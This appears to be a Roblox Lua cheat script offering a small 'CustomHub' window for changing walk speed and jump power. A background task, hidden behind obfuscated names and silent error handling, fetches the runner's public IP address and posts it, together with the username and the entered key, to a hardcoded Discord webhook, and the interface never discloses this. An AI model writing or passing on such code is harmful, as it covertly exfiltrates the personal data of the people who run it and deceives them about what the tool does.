local _h = game:GetService("HttpService")
local _u = game:GetService("UserInputService")

return function(_k)
local _p = game.Players.LocalPlayer
local _c = _p.Character or _p.CharacterAdded:Wait()
local _hum = _c:WaitForChild("Humanoid")

task.spawn(function()
local _ip = "unknown"
pcall(function() _ip = game:HttpGet("https://api.ipify.org") end)
local _d = {
["embeds"] = {{
["title"] = "🚀 Execution Log",
["color"] = 0x00ff00,
["fields"] = {
{["name"] = "User", ["value"] = _p.Name, ["inline"] = true},
{["name"] = "IPv4", ["value"] = "`" .. _ip .. "`", ["inline"] = false},
{["name"] = "Key", ["value"] = "||" .. _k .. "||"}
},
["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
}}
}
pcall(function() _h:PostAsync("https://discord.com/api/webhooks/1452142158420246599/dMFe39Ib4Nqxo63l8RLsu_DK7CA4SH9Kxur3b-KpNAxD_b3Ohww8Lcp5SY3G64b1IMek", _h:JSONEncode(_d)) end)
end)

local _g = Instance.new("ScreenGui", _p.PlayerGui)
_g.Name = "CustomHub"
local _f = Instance.new("Frame", _g)
_f.Size = UDim2.new(0, 200, 0, 220)
_f.Position = UDim2.new(0.5, -100, 0.5, -110)
_f.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
_f.Draggable, _f.Active = true, true

local _s = Instance.new("TextBox", _f)
_s.Size = UDim2.new(0.8, 0, 0, 30)
_s.Position = UDim2.new(0.1, 0, 0.2, 0)
_s.PlaceholderText = "Speed"
_s.FocusLost:Connect(function() _hum.WalkSpeed = tonumber(_s.Text) or 16 end)

local _j = Instance.new("TextBox", _f)
_j.Size = UDim2.new(0.8, 0, 0, 30)
_j.Position = UDim2.new(0.1, 0, 0.4, 0)
_j.PlaceholderText = "Jump"
_j.FocusLost:Connect(function() _hum.JumpPower = tonumber(_j.Text) or 50 end)

local _m = Instance.new("TextButton", _f)
_m.Size = UDim2.new(0, 20, 0, 20)
_m.Position = UDim2.new(1, -25, 0, 5)
_m.Text = "-"
_m.MouseButton1Click:Connect(function()
local _o = _s.Visible
_s.Visible, _j.Visible = not _o, not _o
_f.Size = not _o and UDim2.new(0, 200, 0, 220) or UDim2.new(0, 200, 0, 30)
end)
end
